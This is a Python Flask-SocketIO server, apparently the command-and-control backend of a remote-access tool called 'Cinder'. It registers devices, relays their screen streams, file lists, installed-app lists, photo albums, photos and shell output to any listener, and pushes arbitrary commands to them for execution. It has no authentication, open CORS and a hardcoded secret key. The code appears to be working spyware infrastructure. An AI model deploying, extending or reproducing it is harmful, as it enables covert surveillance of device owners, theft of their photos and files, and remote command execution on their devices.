from flask import Flask, request, jsonify
from flask_socketio import SocketIO, emit
import time, json
from collections import deque

app = Flask(__name__)
app.config['SECRET_KEY'] = 'CINDER_SECRET'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet',
                    max_http_buffer_size=64 * 1024 * 1024,
                    ping_interval=25, ping_timeout=20)

devices = {}
recent = deque(maxlen=2000)
STATS = {'frames': 0, 'drop': 0, 'bytes': 0, 'photos': 0}

@app.route('/')
def health_check():
    return "Cinder Server is Alive."

@app.route('/healthz')
def healthz():
    return jsonify({"ok": True, "agents": len(devices), "frames": STATS['frames'],
                    "drop": STATS['drop'], "photos": STATS['photos']})

@app.route('/api/agents')
def api_agents():
    return jsonify({"agents": [{"id": k, "name": v['name']} for k, v in devices.items()]})

def _touch(device_id):
    info = devices.get(device_id)
    if info:
        info['last_seen'] = time.time()
    return info

@socketio.on('device_online')
def handle_online(data):
    device_id = data.get('device_id')
    if not device_id:
        return
    devices[device_id] = {"socket_id": request.sid, "last_seen": time.time(),
                          "status": "Online", "name": data.get('name', '未知设备')}
    emit('new_device', {'id': device_id, 'name': devices[device_id]['name']}, broadcast=True)

@socketio.on('stream_data')
def handle_stream(data):
    device_id = data.get('device_id')
    if not _touch(device_id):
        return
    seq = data.get('seq')
    if seq is not None:
        key = (device_id, seq)
        if key in recent:
            STATS['drop'] += 1
            return
        recent.append(key)
    payload = data.get('payload')
    if isinstance(payload, dict):
        STATS['bytes'] += len(payload.get('b64', '') or '')
    STATS['frames'] += 1
    emit('forward_stream', {'device_id': device_id, 'kind': data.get('kind', 'screen'),
                            'seq': seq, 'ts': int(time.time() * 1000), 'data': payload},
         broadcast=True, include_self=False)

@socketio.on('device_event')
def handle_event(data):
    device_id = data.get('device_id')
    if not _touch(device_id):
        return
    emit('forward_event', {'device_id': device_id, 'data': data.get('data', {})},
         broadcast=True, include_self=False)

# —— 以下四个透传：事件名与前端 socket.on 一一对应 ——
@socketio.on('file_list')
def handle_file_list(data):
    emit('file_list', data, broadcast=True, include_self=False)

@socketio.on('app_list')
def handle_app_list(data):
    emit('app_list', data, broadcast=True, include_self=False)

@socketio.on('album_list')
def handle_album_list(data):
    STATS['photos'] += len(data.get('items', []) or [])
    emit('album_list', data, broadcast=True, include_self=False)

@socketio.on('photo_data')
def handle_photo_data(data):
    emit('photo_data', data, broadcast=True, include_self=False)

@socketio.on('shell_result')
def handle_shell_result(data):
    emit('shell_result', data, broadcast=True, include_self=False)

@socketio.on('send_command')
def handle_command(data):
    target_id = data.get('target_id')
    if target_id == '__relay__':
        try:
            cmd = json.loads(data.get('command', '{}'))
        except Exception:
            return
        if cmd.get('type') == 'ping':
            emit('pong', {'seq': cmd.get('seq'), 't': cmd.get('t')})
        return
    info = devices.get(target_id)
    if info:
        emit('execute_command', {'cmd': data.get('command')}, room=info['socket_id'])

@socketio.on('disconnect')
def handle_disconnect():
    sid = request.sid
    for dev_id, info in list(devices.items()):
        if info['socket_id'] == sid:
            devices.pop(dev_id, None)
            emit('device_offline', {'device_id': dev_id}, broadcast=True)

def check_offline():
    while True:
        socketio.sleep(5)
        now = time.time()
        for dev_id, info in list(devices.items()):
            if now - info['last_seen'] > 15:
                devices.pop(dev_id, None)
                emit('device_offline', {'device_id': dev_id}, broadcast=True)

if __name__ == "__main__":
    socketio.start_background_task(check_offline)
    socketio.run(app, host='0.0.0.0', port=10000)
